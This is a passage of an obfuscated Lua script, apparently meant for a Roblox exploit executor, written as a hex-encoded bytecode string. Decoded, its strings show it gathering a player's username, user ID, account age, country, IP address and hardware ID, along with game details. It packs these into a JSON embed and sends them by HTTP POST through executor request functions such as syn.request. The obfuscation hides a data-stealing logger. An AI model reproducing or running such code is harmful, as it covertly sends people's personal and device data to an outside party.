B506C6179657220496E666F5D28682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F75736572732F2564292Q5F03503Q00202Q2A0A446973706C6179204E616D653A2Q2A202573200A2Q2A557365726E616D653A2Q2A202573200A2Q2A557365722049643A2Q2A2025640A2Q2A4D656D62657273686970547970653A2Q2A20257303553Q000A2Q2A412Q636F756E744167653A2Q2A2025640A2Q2A436F756E7472793A2Q2A2025732Q2A0A49503A2Q2A2025732Q2A0A487769643A2Q2A2025732Q2A0A446174653A2Q2A2025732Q2A0A54696D653A2Q2A20257303323Q002Q0A2Q5F5B47616D6520496E666F5D28682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F67616D65732F2564292Q5F032F3Q000A2Q2A47616D653A2Q2A202573200A2Q2A47616D652049642Q2A3A202564200A2Q2A4578706C6F69743A2Q2A20257303273Q002Q0A2Q2A446174613A2Q2A3Q6025733Q602Q0A2Q2A4A6F6249643A2Q2A3Q6025733Q6003083Q00746F737472696E6703023Q006F7303043Q006461746503083Q00256D2F25642F255903023Q00255803043Q0067616D6503073Q00506C616365496403043Q007479706503043Q007269636803053Q00636F6C6F7203083Q00746F6E756D62657203083Q0030782Q4644372Q3003093Q007468756D626E61696C03373Q00682Q7470733A2Q2F3Q772E726F626C6F782E636F6D2F6865616473686F742D7468756D626E61696C2F696D6167653F7573657249643D03203Q002677696474683D313530266865696768743D31353026666F726D61743D706E67005E3Q0012063Q00014Q0017000100023Q001206000300013Q000E3C00010003000100030004383Q000300010026353Q000C000100020004383Q000C00012Q003900045Q0020020004000400032Q003F000600024Q001E000400064Q000900045Q0026353Q0002000100010004383Q00020001001206000400013Q00263500040013000100020004383Q001300010012063Q00023Q0004383Q00020001000E3C0001000F000100040004383Q000F00012Q0039000500014Q002E0005000100022Q003F000100054Q004100053Q00030030340005000400050030340005000600072Q0041000600014Q004100073Q00052Q004100083Q00020030340008000A000B0030340008000C000D00102100070009000800121B0008000F3Q002040000800080010001206000900113Q001206000A00123Q001206000B00133Q001206000C00143Q001206000D00153Q001206000E00164Q003B00090009000E2Q0039000A00024Q0039000B00034Q0039000C00044Q0039000D00024Q0039000E00054Q0039000F00064Q0039001000074Q0039001100084Q0039001200093Q00121B001300173Q00121B001400183Q0020400014001400190012060015001A4Q0020001400154Q002200133Q000200121B001400173Q00121B001500183Q0020400015001500190012060016001B4Q0020001500164Q002200143Q000200121B0015001C3Q00204000150015001D2Q00390016000A3Q00121B0017001C3Q00204000170017001D2Q003F001800014Q00390019000B4Q0039001A000C4Q00280008001A00020010210007000E00080030340007001E001F00121B000800213Q001206000900224Q000E0008000200020010210007002000082Q004100083Q0001001206000900244Q0039000A00023Q001206000B00254Q003B00090009000B0010210008000C00090010210007002300082Q00120006000100010010210005000800062Q003F000200053Q001206000400023Q0004383Q000F00010004383Q000200010004383Q000300010004383Q000200012Q002F3Q00017Q000D3Q00028Q00026Q00F03F2Q033Q0055726C03043Q00426F647903063Q004D6574686F6403043Q00504F535403073Q0048656164657273030C3Q00636F6E74656E742D7479706503103Q00612Q706C69636174696F6E2F6A736F6E030C3Q00682Q74705F7265717565737403083Q00482Q7470506F73742Q033Q0073796E03073Q007265717565737402203Q001206000200014Q0017000300053Q0026350002000E000100020004383Q000E00012Q004100063Q0004001021000600033Q0010210006000400010030340006000500060010210006000700032Q003F000500064Q003F000600044Q003F000700054Q00180006000200010004383Q001F000100263500020002000100010004383Q000200012Q004100063Q00010030340006000800092Q003F000300063Q00121B0006000A3Q0006270004001D000100060004383Q001D000100061D0004001D000100010004383Q001D000100121B0006000B3Q0006270004001D000100060004383Q001D000100121B0006000C3Q00204000040006000D001206000200023Q0004383Q000200012Q002F3Q00017Q00",v9(),...);
